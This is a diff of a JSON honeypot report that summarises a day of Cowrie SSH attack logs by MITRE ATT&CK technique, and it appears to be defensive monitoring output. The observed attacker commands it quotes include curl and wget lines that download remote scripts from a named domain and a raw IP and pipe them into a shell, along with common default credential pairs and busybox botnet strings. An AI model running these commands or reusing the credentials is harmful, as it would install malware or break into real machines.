@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-24 22:03:27",
+  "generated": "2026-08-24 23:03:11",
   "totals": {
-    "commands": 553,
-    "login_failed": 2191,
-    "login_success": 124,
-    "sessions": 2451
+    "commands": 567,
+    "login_failed": 2266,
+    "login_success": 131,
+    "sessions": 2534
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2191,
+      "count": 2266,
       "examples": [
         "root / 123456",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-08-24T00:00:38.589360Z",
-      "last": "2026-08-24T22:02:29.671162Z",
-      "unique_ips": 106
+      "last": "2026-08-24T23:01:25.696266Z",
+      "unique_ips": 109
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 124,
+      "count": 131,
       "examples": [
         "root / e10adc39",
         "ubuntu / ubuntu",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-08-24T00:20:02.041462Z",
-      "last": "2026-08-24T22:02:31.071687Z",
-      "unique_ips": 76
+      "last": "2026-08-24T23:01:32.137392Z",
+      "unique_ips": 79
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 66,
+      "count": 68,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,7 +53,7 @@
         "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
       ],
       "first": "2026-08-24T00:50:34.498920Z",
-      "last": "2026-08-24T22:02:33.359403Z",
+      "last": "2026-08-24T22:30:20.088109Z",
       "unique_ips": 10
     },
     {
@@ -76,7 +76,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 29,
+      "count": 31,
       "examples": [
         "uname -a",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -85,8 +85,8 @@
         "uname -m"
       ],
       "first": "2026-08-24T00:42:00.777388Z",
-      "last": "2026-08-24T22:00:05.060990Z",
-      "unique_ips": 19
+      "last": "2026-08-24T23:01:32.339269Z",
+      "unique_ips": 21
     },
     {
       "id": "T1059.004",
@@ -224,15 +224,15 @@
     ],
     [
       "shell",
-      40
+      42
     ],
     [
       "sh",
-      39
+      41
     ],
     [
       "system",
-      31
+      32
     ],
     [
       "zalee",
@@ -248,7 +248,7 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      16
+      17
     ],
     [
       "enable",
@@ -276,7 +276,7 @@
     ],
     [
       "/bin/busybox SORA",
-      5
+      6
     ],
     [
       "ping; sh",
@@ -291,11 +291,11 @@
       3
     ],
     [
-      "Accept-Encoding: gzip",
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
       2
     ],
     [
-      "exit",
+      "python3 /tmp/bendi.py",
       2
     ]
   ]
